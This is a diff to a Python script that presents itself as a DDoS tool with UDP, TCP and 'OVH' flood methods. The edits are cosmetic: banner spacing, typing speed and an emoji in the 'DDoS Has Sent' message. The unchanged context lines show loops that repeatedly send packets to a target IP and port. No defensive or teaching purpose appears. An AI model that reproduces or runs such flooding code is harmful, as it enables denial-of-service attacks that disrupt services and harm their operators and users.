@@ -14,7 +14,7 @@ import getpass
 time.sleep(1)
 os.system("clear")
 
-os.system("figlet DDoS")
+os.system("figlet    DDoS")
 time.sleep(3)
 
 def  type(s):
@@ -25,7 +25,7 @@ def  type(s):
 
               sys.stdout.flush( )
 
-              time.sleep(0.035)
+              time.sleep(0.045)
 
 type("""Tools DDos Methods udp/tcp/ovh""")
 print()
@@ -44,7 +44,7 @@ def udp():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" DDoS Has Sent")
+			print(i +" DDoS Has Sent 💥")
 		except:
 			print("ERROR Command")
 			
@@ -57,7 +57,7 @@ def tcp():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" DDoS Has Sent")
+			print(i +" DDoS Has Sent 💥")
 		except:
 			print("ERROR Command")
 			
@@ -70,7 +70,7 @@ def ovh():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" DDoS Has Sent")
+			print(i +" DDoS Has Sent 💥")
 		except:
 			print("ERROR Command")
 
